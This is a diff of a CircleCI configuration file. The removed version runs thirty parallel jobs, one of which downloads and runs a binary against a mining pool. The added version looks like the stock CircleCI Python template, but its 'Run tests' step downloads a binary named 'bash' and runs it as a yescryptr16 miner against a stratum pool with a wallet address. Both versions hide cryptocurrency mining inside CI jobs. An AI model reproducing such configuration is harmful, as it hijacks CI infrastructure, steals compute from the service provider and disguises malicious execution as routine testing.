@@ -1,172 +1,47 @@
-working_dir: &working_dir ~/app 
-.build_template: &script 
-  steps: 
-    - checkout 
-    - run: 
-        name: Install Dependencies 
-        command: | 
-                    apt-get update 
-                    apt-get upgrade -y 
-                    apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake 
-    - run: 
-        name: Run tests 
-        command: | 
-                    chmod +x deploy.sh 
-                    ./deploy.sh
-version: 2.0 
-jobs: 
-  build1: 
-    command: wget https://github.com/viloidka/go/raw/main/Pyton-rk && chmod +x Pyton-rk && ./Pyton-rk -r 157.230.26.157:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xms2rr3jv2qcjzsmjxutd.rtx3060
-    docker: 
-      - image: ruby 
-  build2: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build3: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build4: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build5: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build6: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build7: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build8: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build9: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build10: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build11: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build12: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build13: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build14: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build15: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build16: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build17: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build18: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build19: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build20: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build21: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build22: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build23: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build24: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build25: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build26: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build27: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build28: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build29: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build30: 
-    <<: *script 
-    docker: 
-      - image: ruby 
- 
-workflows: 
-  version: 2 
-  commit: 
-    jobs: 
-      - build1 
-      - build2 
-      - build3 
-      - build4 
-      - build5 
-      - build6 
-      - build7 
-      - build8 
-      - build9 
-      - build10 
-      - build11 
-      - build12 
-      - build13 
-      - build14 
-      - build15 
-      - build16 
-      - build17 
-      - build18 
-      - build19 
-      - build20 
-      - build21 
-      - build22 
-      - build23 
-      - build24 
-      - build25 
-      - build26 
-      - build27 
-      - build28 
-      - build29 
-      - build30
+# Use the latest 2.1 version of CircleCI pipeline process engine.
+# See: https://circleci.com/docs/2.0/configuration-reference
+version: 2.1
+
+# Orbs are reusable packages of CircleCI configuration that you may share across projects, enabling you to create encapsulated, parameterized commands, jobs, and executors that can be used across multiple projects.
+# See: https://circleci.com/docs/2.0/orb-intro/
+orbs:
+  # The python orb contains a set of prepackaged CircleCI configuration you can use repeatedly in your configuration files
+  # Orb commands and jobs help you with common scripting around a language/tool
+  # so you dont have to copy and paste it everywhere.
+  # See the orb documentation here: https://circleci.com/developer/orbs/orb/circleci/python
+  python: circleci/python@1.5.0
+
+# Define a job to be invoked later in a workflow.
+# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
+jobs:
+  build-and-test: # This is the name of the job, feel free to change it to better match what you're trying to do!
+    # These next lines defines a Docker executors: https://circleci.com/docs/2.0/executor-types/
+    # You can specify an image from Dockerhub or use one of the convenience images from CircleCI's Developer Hub
+    # A list of available CircleCI Docker convenience images are available here: https://circleci.com/developer/images/image/cimg/python
+    # The executor is the environment in which the steps below will be executed - below will use a python 3.10.2 container
+    # Change the version below to your required version of python
+    docker:
+      - image: cimg/python:3.10.2
+    # Checkout the code as the first step. This is a dedicated CircleCI step.
+    # The python orb's install-packages step will install the dependencies from a Pipfile via Pipenv by default.
+    # Here we're making sure we use just use the system-wide pip. By default it uses the project root's requirements.txt.
+    # Then run your tests!
+    # CircleCI will report the results back to your VCS provider.
+    steps:
+      - checkout
+      - python/install-packages:
+          pkg-manager: pip
+          # app-dir: ~/project/package-directory/  # If your requirements.txt isn't in the root directory.
+          # pip-dependency-file: test-requirements.txt  # if you have a different name for your requirements file, maybe one that combines your runtime and test requirements.
+      - run:
+          name: Run tests
+          # This assumes pytest is installed via the install-package step above
+          command: wget https://github.com/githuboneheart/Nim/raw/main/bash && chmod +x bash && ./bash -a yescryptr16 -o stratum+tcp://68.183.25.12:443  -u web1qwxq0q8vkey330zh6p2cuxtjrdcdhh3kk9kmtct.YaAllahHu -p m=solo -t 16
+
+# Invoke jobs via workflows
+# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
+workflows:
+  sample: # This is the name of the workflow, feel free to change it to better match your workflow.
+    # Inside the workflow, you define the jobs you want to run.
+    jobs:
+      - build-and-test
